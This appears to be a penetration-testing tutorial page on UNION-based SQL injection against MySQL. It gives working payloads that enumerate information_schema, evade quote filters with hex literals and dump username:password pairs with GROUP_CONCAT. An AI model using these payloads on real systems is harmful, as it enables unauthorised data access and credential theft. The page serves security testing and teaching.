---
title: "Extracting MySQL data through information_schema with UNION"
description: "Walking the MySQL catalog with UNION SELECT: list databases, tables, and columns from information_schema, then dump rows with GROUP_CONCAT."
keywords:
  - information_schema
  - UNION SELECT extraction
  - GROUP_CONCAT
  - MySQL table enumeration
  - column enumeration
---

# Extraction via information_schema

Once the column count is known and a reflected string position is found, `information_schema` gives a complete map of the server, and `GROUP_CONCAT()` packs many rows into the single reflected cell. The examples below assume a three-column query whose second column is reflected.

List the databases:

```sql
' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata-- 
```

List the tables in the current database:

```sql
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- 
```

List the columns of a target table. Quoting the table name is often filtered, so pass it as a hex literal (`users` is `0x7573657273`), which needs no quotes:

```sql
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name=0x7573657273-- 
```

Dump the rows. Separate fields with a hex delimiter so the concatenated output stays readable, for example `0x3a` for a colon:

```sql
' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users-- 
```

`GROUP_CONCAT` truncates at `group_concat_max_len` (1024 bytes by default). When a table is larger than that, raise the limit if the account allows it with `SET SESSION group_concat_max_len=1000000`, or page through the rows with `LIMIT offset,1` and read them one at a time.

## References

- MySQL Reference Manual: `information_schema` tables, GROUP_CONCAT, group_concat_max_len
- OWASP Testing Guide: Testing for SQL Injection
